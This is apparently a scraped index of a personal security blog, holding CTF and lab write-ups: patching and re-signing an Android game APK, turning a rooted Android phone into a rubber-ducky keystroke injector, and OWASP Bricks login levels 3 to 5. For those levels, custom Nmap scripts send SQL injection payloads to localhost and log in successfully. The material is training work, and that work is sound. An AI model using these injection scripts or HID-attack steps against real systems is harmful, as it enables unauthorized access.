What is the name of your organization? What is the name of your City or Locality? What is the name of your State or Province? What is the two-letter country code for this unit? Is CN=a, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct? [no]: yes Generating 2,048 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 10,000 days for: CN=a, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [Storing modify.keystore] After the keystore is created, sign the APK file.\n1 2 PS D:\\Desktop\\Android\\world2\u0026gt; apksigner sign --ks .\\modify.keystore .\\world-2-modified.apk Keystore password for signer #1: After that, Just run the game and hope everything is working.\nAs shown in image, I managed to change the weapon stats by modifying the params value. Now that my stats are high, I could easily win the game.\nAfter I win each boss, I\u0026rsquo;ll get a partial flag.\nFlag 1 Flag 2 Flag 3 Flag 4 This part of flag appear in the map after winning boss 4 Flag 5 After winning the boss, you will need to talk to a dude and it will give you 23 7 13 25 which is order of the alphabelt wgmy. Then a QR will be provided. 4f51785} Things I learned from this challenge reading code using static analysis patching the APK Cheat the game to win ","permalink":"https://callmeks.github.io/posts/wgmy2024-world-ii/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelp, time to do it again.\u003c/p\u003e\n\u003cp\u003eUnable to install? That is a part of the challenge, try to overcome it.\u003c/p\u003e\n\u003cp\u003eAuthor: Trailbl4z3r \u0026amp; Monaruku\u003c/p\u003e\n\u003cp\u003ehint:\nTbh this is not a natively built app, more like something just wrapped into an app\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/World_II.apk\"\u003eWorld-II.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eSince it\u0026rsquo;s an APK file, Lets start with \u003ccode\u003ejadx-gui\u003c/code\u003e for static analysis. In terms of static analysis, it\u0026rsquo;s always best to check out \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e first.\u003c/p\u003e","title":"WGMY2024 World II"},{"content":"Prerequisite a physical android devices rooted termux app As mentioned, the android devices must be rooted in order to work like a rubber ducky. I\u0026rsquo;ll be using my old devices that I have rooted as demonstration purposes.\nHere\u0026rsquo;s a quick evidence that my devices is rooted.\nSetting up Now that the android devices is rooted, I\u0026rsquo;ll need to download some useful files and application that has been created by others\nandroid usb gadget hid-gadget-test poc_pc_gadget Install the android usb gadget and prepare both the hid-gadget-test and poc_pc_gadget in your devices. After everything is ready, open the android usb gadget application.\nIt should have a popup where it ask about superuser rights. After that, scroll down and use the second option or add another one if there\u0026rsquo;s no second option. In the second option, add keyboard will do.\nAfter adding it, remember to turn on by pressing the \u0026ldquo;Gadget status\u0026rdquo; and process to android terminal (termux).\nMake sure to place the both the file in a same directory and both the file has execute permission.\nBasically, hid-gadget-test is a binary and poc_pc_gadget is a script.\nOne last thing is to take note is the /dev/hidg1. In some cases, the hidg number will be different make sure to have a look. Somehow, I\u0026rsquo;ll need to give all permission to everyone in order to make this works. /dev/hidg1 will only appear if you have turn on the \u0026ldquo;Gadget status\u0026rdquo;.\nSince it does not have execute permission by default, I\u0026rsquo;ll need to change the permission myself.\nAfter everything is done, I could just run the poc_pc_gadget to perform HID attack. remember to give it some try and error\nPOC Here\u0026rsquo;s a demonstration on how it works.\nReferences android usb gadget hid-gadget-test poc_pc_gadget youtube video ","permalink":"https://callmeks.github.io/posts/android-as-rubber-ducky/","summary":"\u003ch2 id=\"prerequisite\"\u003ePrerequisite\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003ea physical android devices\n\u003cul\u003e\n\u003cli\u003erooted\u003c/li\u003e\n\u003cli\u003etermux app\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAs mentioned, the android devices must be rooted in order to work like a rubber ducky. I\u0026rsquo;ll be using my old devices that I have rooted as demonstration purposes.\u003c/p\u003e\n\u003cp\u003eHere\u0026rsquo;s a quick evidence that my devices is rooted.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"alt text\" loading=\"lazy\" src=\"/posts/android-as-rubber-ducky/img/index.png#center\"\u003e\u003c/p\u003e\n\u003ch2 id=\"setting-up\"\u003eSetting up\u003c/h2\u003e\n\u003cp\u003eNow that the android devices is rooted, I\u0026rsquo;ll need to download some useful files and application that has been created by others\u003c/p\u003e","title":"Android as Rubber Ducky"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-5/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall5.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:51 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). PORT STATE SERVICE 80/tcp open http | chall1: | result: Succesfully logged in. | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;098f6bcd4621d373cade4e832627b4f6\u0026#39; | payload: | submit: Submit | username: a\u0026#39; OR 1=1-- a |_ passwd: test Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-5/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-5/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 5"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 4 is just a SQL injection with bracket and uses double quote. Here\u0026rsquo;s an example: SQL Query: SELECT * FROM users WHERE name=(\u0026quot;a\u0026quot;) and password=(\u0026quot;a\u0026quot;). We could just modify previous NSE script by changing the query.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\\\u0026#34;) OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-4/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall4.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:48 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00011s latency). PORT STATE SERVICE 80/tcp open http | chall1: | SQLQuery: : SELECT * FROM users WHERE name=(\u0026#34;a\u0026#34;) OR 1=1-- a\u0026#34;) and password=(\u0026#34;test\u0026#34;) | payload: | passwd: test | username: a\u0026#34;) OR 1=1-- a | submit: Submit |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-4/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 4 is just a SQL injection with bracket and uses double quote. Here\u0026rsquo;s an example: \u003ccode\u003eSQL Query: SELECT * FROM users WHERE name=(\u0026quot;a\u0026quot;) and password=(\u0026quot;a\u0026quot;)\u003c/code\u003e. We could just modify previous NSE script by changing the query.\u003c/p\u003e","title":"Bricks Login 4"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 3 is just a slightly harder SQL injection as it add brackets. Here\u0026rsquo;s an example: SQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39;) OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-3/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall3.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:40 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00014s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | username: a\u0026#39;) OR 1=1-- a | submit: Submit | passwd: test | SQLQuery: : SELECT * FROM users WHERE name=(\u0026#39;a\u0026#39;) OR 1=1-- a\u0026#39;) and password=(\u0026#39;test\u0026#39;) LIMIT 0,1 |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-3/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 3 is just a slightly harder SQL injection as it add brackets. Here\u0026rsquo;s an example: \u003ccode\u003eSQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" 